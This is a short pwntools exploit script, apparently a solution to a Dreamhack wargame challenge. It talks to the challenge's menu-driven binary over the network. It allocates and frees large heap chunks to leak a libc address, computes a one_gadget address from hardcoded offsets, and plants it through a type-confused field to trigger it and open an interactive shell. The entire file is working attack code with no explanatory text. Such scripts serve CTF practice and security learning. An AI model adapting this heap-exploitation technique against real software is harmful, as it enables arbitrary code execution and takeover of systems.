from pwn import *
p=remote("host1.dreamhack.games",11290)

def human(weight, age):
    p.sendlineafter(b">",b"1")
    p.sendlineafter(b": ",str(weight).encode())
    p.sendlineafter(b": ",str(age).encode())

def robot(weight):
    p.sendlineafter(b">",b"2")
    p.sendlineafter(b": ",str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b">",b"3")
    p.sendlineafter(b": ",str(size).encode())
    p.sendafter(b": ",data)
    p.sendlineafter(b": ",str(idx).encode())

custom(0x500,b"A",-1)
custom(0x500,b"A",-1)
custom(0x500,b"A",0)
custom(0x500,b"B",-1)

libcbase=u64(p.recvline()[:-1].ljust(8,b"\x00"))-0x3ebc42
og=libcbase+0x10a41c

human(1,og)
robot(1)

p.interactive()